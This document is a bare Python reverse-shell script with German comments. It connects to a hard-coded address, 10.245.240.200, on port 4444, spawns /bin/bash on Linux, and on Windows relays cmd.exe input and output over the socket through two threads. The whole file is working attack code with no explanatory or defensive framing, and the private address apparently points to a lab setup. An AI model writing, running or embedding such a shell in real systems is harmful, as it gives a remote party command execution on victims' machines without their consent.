import platform
import socket
import os


operating = platform.system()
shell_ip = "10.245.240.200"
port = 4444


if operating == "Linux":
    import pty
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((shell_ip, port))
    [os.dup2(s.fileno(),f) for f in(0,1,2)]
    pty.spawn("/bin/bash")
elif operating == "Windows":
    import threading
    import subprocess

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((shell_ip, port))

    # Prozess mit normalen Pipes starten
    p = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0  # Ungepuffert für sofortige Weiterleitung
    )

    def socket_to_process():
        """Liest vom Socket und schreibt in cmd.exe"""
        while True:
            try:
                data = s.recv(1024)
                if not data:
                    break
                p.stdin.write(data)
                p.stdin.flush()
            except Exception:
                break
        p.stdin.close()

    def process_to_socket():
        """Liest von cmd.exe und schickt durch den Socket"""
        while True:
            try:
                data = p.stdout.read(1)  # byte-weise lesen
                if not data:
                    break
                s.send(data)
            except Exception:
                break
        s.close()

    # Beide Richtungen parallel starten
    threading.Thread(target=socket_to_process, daemon=True).start()
    threading.Thread(target=process_to_socket, daemon=True).start()

    # Warten, bis cmd.exe beendet wird
    p.wait()

